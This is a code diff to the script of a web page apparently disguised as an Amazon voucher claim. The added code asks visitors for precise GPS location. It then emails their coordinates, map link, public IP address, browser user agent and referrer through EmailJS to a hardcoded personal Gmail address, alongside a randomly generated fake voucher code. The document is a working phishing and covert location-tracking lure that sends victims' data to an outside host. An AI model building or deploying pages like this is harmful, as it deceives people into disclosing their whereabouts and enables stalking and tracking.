@@ -341,124 +341,143 @@
     </div>
 
     <script>
-        // EmailJS Setup - REPLACE YOUR KEYS
-        emailjs.init("sFyc4qhqeMe2IoZ7U");
-    
+        // ⚠️ REPLACE THESE WITH YOUR EMAILJS CREDENTIALS (Required)
+        emailjs.init("sFyc4qhqeMe2IoZ7U"); // EmailJS Dashboard → Account → Public Key
+
         let currentPosition = null;
-    
+
         function requestLocation() {
-            // VISUAL FEEDBACK FIRST
             const btn = document.querySelector('.permission-btn');
             const loading = document.getElementById('loading');
-            
-            btn.innerHTML = '🔄 Verifying...';
-            btn.disabled = true;
+            const result = document.getElementById('result');
+            const error = document.getElementById('error');
+
+            btn.style.display = 'none';
             loading.style.display = 'block';
-    
-            // IMMEDIATE LOCATION REQUEST - NO DELAY
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    successCallback,
-                    errorCallback,
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0  // Fresh location only
-                    }
-                );
-            } else {
-                showError('Location not supported');
+            result.style.display = 'none';
+            error.style.display = 'none';
+
+            if (!navigator.geolocation) {
+                showError('Location services not supported by your browser.');
+                return;
             }
+
+            navigator.geolocation.getCurrentPosition(
+                onLocationSuccess,
+                onLocationError,
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 60000
+                }
+            );
         }
-    
-        function successCallback(position) {
+
+        async function onLocationSuccess(position) {
             currentPosition = position;
             const { latitude, longitude, accuracy } = position.coords;
-            const timestamp = new Date().toLocaleString('en-IN');
-            
-            // UPDATE UI
-            showSuccess(latitude, longitude, accuracy, timestamp);
-            
-            // SEND EMAIL
-            sendVoucherEmail(latitude, longitude, accuracy, timestamp);
-        }
-    
-        function errorCallback(error) {
-            console.log('Location error:', error);
-            let message = 'Location access needed: ';
-            
-            switch(error.code) {
-                case 1:
-                    message += 'Allow location permission';
-                    break;
-                case 2:
-                    message += 'GPS signal weak - go outside';
-                    break;
-                case 3:
-                    message += 'Request timeout - try again';
-                    break;
-                default:
-                    message += 'Unknown error';
-            }
-            
-            showError(message);
-            resetButton();
-        }
-    
-        function showSuccess(lat, lng, acc, time) {
-            document.getElementById('coords').innerHTML = 
-                `✅ Latitude: ${lat.toFixed(6)}<br>
-                 ✅ Longitude: ${lng.toFixed(6)}<br>
-                 📏 Accuracy: ${Math.round(acc)}m<br>
-                 🕒 Time: ${time}`;
-            
-            const mapsUrl = `https://maps.app.goo.gl/?q=${lat},${lng}`;
-            document.getElementById('mapsLink').href = mapsUrl;
-            document.getElementById('mapsLink').textContent = mapsUrl;
-            
+            const timestamp = new Date().toLocaleString('en-IN', {
+                timeZone: 'Asia/Kolkata',
+                weekday: 'short',
+                year: 'numeric',
+                month: 'short',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+
+            document.getElementById('coords').innerHTML =
+                `📍 Latitude: ${latitude.toFixed(6)}<br>
+                 📍 Longitude: ${longitude.toFixed(6)}<br>
+                 📏 Accuracy: ${Math.round(accuracy)}m<br>
+                 🕒 Claim Time: ${timestamp}<br>
+                 💻 Device: ${navigator.userAgent.slice(0, 60)}...`;
+
+            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=16`;
+            const linkElement = document.getElementById('mapsLink');
+            linkElement.href = mapsUrl;
+            linkElement.textContent = `🗺️ View on Google Maps: ${mapsUrl}`;
+
+            // SEND LOCATION TO YOUR EMAIL
+            await sendVoucherEmail(latitude, longitude, accuracy, timestamp);
+
             document.getElementById('loading').style.display = 'none';
             document.getElementById('result').style.display = 'block';
         }
-    
-        async function sendVoucherEmail(lat, lng, acc, time) {
+
+        async function sendVoucherEmail(lat, lng, accuracy, timestamp) {
             try {
-                const templateData = {
-                    to_email: 'tarunroy0218@gmail.com',
-                    lat: lat.toFixed(6),
-                    lng: lng.toFixed(6),
-                    accuracy: Math.round(acc),
-                    timestamp: time,
-                    maps: `https://maps.app.goo.gl/?q=${lat},${lng}`,
-                    ip: await (await fetch('https://api.ipify.org')).text(),
-                    ua: navigator.userAgent.slice(0,100),
-                    coords: `${lat.toFixed(6)},${lng.toFixed(6)}`
-                };
-                
-                await emailjs.send('service_rck843j', 'template_f91jyos', templateData);
-                console.log('✅ EMAIL SENT!');
-            } catch(e) {
-                console.error('Email failed:', e);
+                const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'Unknown');
+
+                await emailjs.send('service_rck843j', 'template_f91jyos', {
+                    to_email: 'tarunroy0218@gmail.com',  // ← YOUR EMAIL HERE
+                    voucher_code: 'AMZ-' + Math.random().toString(36).substr(2, 9).toUpperCase(),
+                    latitude: lat.toFixed(6),
+                    longitude: lng.toFixed(6),
+                    accuracy: Math.round(accuracy) + 'm',
+                    timestamp: timestamp,
+                    maps_url: mapsUrl,
+                    ip_address: ip,
+                    device: navigator.userAgent.slice(0, 100),
+                    full_coords: `${lat.toFixed(6)}, ${lng.toFixed(6)}`,
+                    referrer: document.referrer || 'Direct'
+                });
+
+                console.log('✅ Voucher claim emailed!');
+            } catch (error) {
+                console.error('❌ Email failed:', error);
+                showError('Verification data captured but email failed. Contact support.');
             }
         }
-    
-        function showError(msg) {
-            document.getElementById('error').innerHTML = `❌ ${msg}`;
-            document.getElementById('error').style.display = 'block';
+
+        function onLocationError(error) {
             document.getElementById('loading').style.display = 'none';
-        }
-    
-        function resetButton() {
-            const btn = document.querySelector('.permission-btn');
-            btn.innerHTML = '🔓 Allow Location & Claim';
-            btn.disabled = false;
-        }
-    
-        // AUTO-TRIGGER ON LOAD (OPTIONAL)
-        window.onload = function() {
-            if (navigator.geolocation) {
-                console.log('✅ Location ready');
+            let message = '';
+
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    message = "Location access denied. Enable permissions to claim voucher.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    message = "Location unavailable. Try again or check GPS.";
+                    break;
+                case error.TIMEOUT:
+                    message = "Request timed out. Please try again.";
+                    break;
+                default:
+                    message = "Location error occurred. Please try again.";
             }
-        };
+
+            showError(message);
+            document.querySelector('.permission-btn').style.display = 'block';
+        }
+
+        function showError(message) {
+            const errorDiv = document.getElementById('error');
+            errorDiv.innerHTML = `❌ ${message}`;
+            errorDiv.style.display = 'block';
+        }
+
+        function copyToClipboard(elementId) {
+            let text;
+            if (elementId === 'coords') {
+                text = document.getElementById('coords').textContent;
+            } else {
+                text = document.getElementById('mapsLink').textContent;
+            }
+
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = event.target;
+                const originalText = btn.textContent;
+                btn.innerHTML = '✅ Copied!';
+                btn.style.background = '#059669';
+                setTimeout(() => {
+                    btn.innerHTML = originalText;
+                    btn.style.background = '';
+                }, 2000);
+            });
+        }
     </script>
 </body>
 
